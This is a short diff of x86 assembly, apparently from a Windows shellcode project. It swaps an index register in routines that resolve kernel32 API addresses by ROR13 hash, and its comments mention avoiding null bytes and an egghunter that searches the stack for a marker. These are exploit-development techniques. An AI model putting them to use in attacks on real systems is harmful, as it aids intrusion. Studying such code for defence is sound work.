@@ -156,8 +156,8 @@ find_function_compare:
 
 find_function_finished:
         popad                                   ; restore all the registers again
-        mov [ebp + ecx], eax                    ; save the funtion address in our table
-        sub ecx, 0fffffffch                     ; increase ecx by 4 (size of dword), and avoid nullbytes
+        mov [ebp + edi], eax                    ; save the funtion address in our table
+        sub edi, 0fffffffch                     ; increase edi by 4 (size of dword), and avoid nullbytes
         ret
 
 ; An egghunter is a small bit of code, that we can use to brute-force search the stack for a given value: DAVEDAVE
@@ -177,7 +177,7 @@ matched:
 ; we use the ror13 hash for the name of the API functions to not push the whole string of the api onto the stack,
 ; example: https://medium.com/asecuritysite-when-bob-met-alice/ror13-and-its-linkage-to-api-calls-within-modules-c2191b35161d
 resolve_symbols_kernel32:
-        mov cl, 10h                             ; ecx will be used as an index to where on ebp the function address will be stored
+        mov edi, 10h                             ; edi will be used as an index to where on ebp the function address will be stored
 
         push hash_LoadLibraryA
         call find_function
